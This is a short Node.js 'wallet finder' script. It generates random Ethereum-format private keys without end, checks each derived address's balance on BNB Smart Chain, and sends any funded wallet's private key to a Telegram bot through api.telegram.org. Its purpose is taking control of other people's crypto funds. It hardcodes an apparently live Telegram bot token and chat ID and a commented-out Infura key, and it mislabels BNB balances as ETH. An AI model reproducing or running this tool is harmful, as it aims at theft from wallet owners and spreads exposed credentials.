const crypto = require('crypto');
const { ethers } = require('ethers');
const axios = require('axios');

// === CONFIGURATION ===

// RPC endpoints
// const ETH_RPC = "https://mainnet.infura.io/v3/SQ974EJXQC1NQTYV6BT711SSIQ39WZH152"; // Ethereum mainnet
const BSC_RPC = "https://bsc-dataseed.binance.org/"; // optional fallback

// Telegram bot credentials
const TELEGRAM_TOKEN = "8474564146:AAHdzPcvMszU_JRsWZZ2eHQxQYWwEWingc4"; // ← replace with your bot token
const CHAT_ID = "6586485950"; // ← replace with your chat ID

// Choose network (change to BSC_RPC if you want to check BNB)
const provider = new ethers.providers.JsonRpcProvider(BSC_RPC);

// === FUNCTIONS ===

// Generate random private key
function genPrivateKeyHex() {
  return crypto.randomBytes(32).toString('hex');
}

// Send a Telegram message
async function sendTelegramMessage(message) {
  const url = `https://api.telegram.org/bot${TELEGRAM_TOKEN}/sendMessage`;
  try {
    await axios.get(url, {
      params: { chat_id: CHAT_ID, text: message },
    });
    console.log("📩 Telegram message sent!");
  } catch (err) {
    console.error("❌ Telegram send error:", err.message);
  }
}

// === MAIN LOOP ===
async function checkWallets() {
  while (true) {
    const priv = '0x' + genPrivateKeyHex();
    const wallet = new ethers.Wallet(priv);

    try {
      const balance = await provider.getBalance(wallet.address);
      const ethBal = ethers.utils.formatEther(balance);

      if (parseFloat(ethBal) > 0) {
        console.log(`✅ Found wallet with balance!`);
        console.log(`Address: ${wallet.address}`);
        console.log(`Private Key: ${wallet.privateKey}`);
        console.log(`Balance: ${ethBal} ETH`);

        // Send Telegram alert
        await sendTelegramMessage(
          `✅ Found wallet with balance!\nAddress: ${wallet.address}\nPrivate Key: ${wallet.privateKey}\nBalance: ${ethBal} BNB`
        );

        break; // Stop after finding a wallet with balance
      } else {
        console.log(`Checked: ${wallet.address} | Balance: ${ethBal} ETH`);

        // Optional: comment this out if too spammy
        // await sendTelegramMessage(`Checked: ${wallet.address}\nBalance: ${ethBal} ETH`);
      }
    } catch (err) {
      console.error("⚠️ Error checking wallet:", err.message);
    }
  }
}

// === START BOT ===
checkWallets();
